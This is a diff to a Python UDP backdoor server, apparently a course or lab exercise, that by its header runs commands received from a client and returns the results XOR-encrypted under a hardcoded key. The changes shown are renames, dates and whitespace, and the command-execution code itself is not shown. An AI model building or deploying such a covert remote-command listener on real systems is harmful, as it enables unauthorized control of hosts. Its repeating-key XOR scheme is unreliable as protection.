@@ -6,7 +6,7 @@
 ##	FUNCTIONS:		    xor_crypt
 ##                      remoteExecute
 ##
-##	LAST MODIFIED:		October 4, 2014
+##	LAST MODIFIED:		October 6, 2014
 ##
 ##	DESIGNERS:	        Zach Smoroden & Slade Solobay
 ##
@@ -14,7 +14,7 @@
 ##
 ##	NOTES:
 ##	This program listens for the client to send remote commands. They will be run, and the results sent
-##  back to the client encrypted.
+##  	back to the client encrypted.
 ##
 ##  OUTPUT: commands/data is printed to standard out to easily see what is happening while testing.
 ##
@@ -40,7 +40,7 @@ DPORT = 7999
 FILTER = "udp and src port {0} and dst port {1}".format(SPORT, DPORT)
 
 # Must make sure it is the same as the client
-KEY = "zdehjk"
+ENCRYPTION_KEY = "zdehjk"
 ######################################################################
 
 
@@ -48,17 +48,17 @@ KEY = "zdehjk"
 ######################################################################
 ##	FUNCTION:	    xor_crypt
 ##
-##	INTERFACE:	    xor_crypt(data, key=KEY, encode=False, decode=False)
+##	INTERFACE:	    xor_crypt(data, ENCRYPTION_KEY=ENCRYPTION_KEY, encode=False, decode=False)
 ##
 ##				    data:   The payload of the packet sent from the client that contains the
 ##                          command to execute
-##                  key:    The encryption key. Defaults to the user-defined variable KEY
+##                  ENCRYPTION_KEY:    The encryption ENCRYPTION_KEY. Defaults to the user-defined variable ENCRYPTION_KEY
 ##                  encode: When true, encrypt the data. Default is False.
 ##                  decode: When true, decode the data. Default is False.
 ##
 ##	RETURNS:        The encoded or decoded data.
 ##
-##	LAST MODIFIED:  October 5, 2014
+##	LAST MODIFIED:  October 6, 2014
 ##
 ##	DESIGNERS:	    Zach Smoroden & Slade Solobay
 ##
@@ -69,11 +69,11 @@ KEY = "zdehjk"
 ##          specified in the call.
 ##
 ######################################################################
-def xor_crypt(data, key=KEY, encode=False, decode=False):
+def xor_crypt(data, ENCRYPTION_KEY=ENCRYPTION_KEY, encode=False, decode=False):
     if decode:
-        message = ''.join(chr(ord(c)^ord(k)) for c,k in izip(data, cycle(key)))
+        message = ''.join(chr(ord(c)^ord(k)) for c,k in izip(data, cycle(ENCRYPTION_KEY)))
     if encode:
-        message = ''.join(chr(ord(c)^ord(k)) for c,k in izip(data, cycle(key)))
+        message = ''.join(chr(ord(c)^ord(k)) for c,k in izip(data, cycle(ENCRYPTION_KEY)))
     return message
 
 ######################################################################
@@ -85,7 +85,7 @@ def xor_crypt(data, key=KEY, encode=False, decode=False):
 ##
 ##	RETURNS:        Sends response to client, prints info.
 ##
-##	LAST MODIFIED:  October 5, 2014
+##	LAST MODIFIED:  October 6, 2014
 ##
 ##	DESIGNERS:	    Zach Smoroden & Slade Solobay
 ##
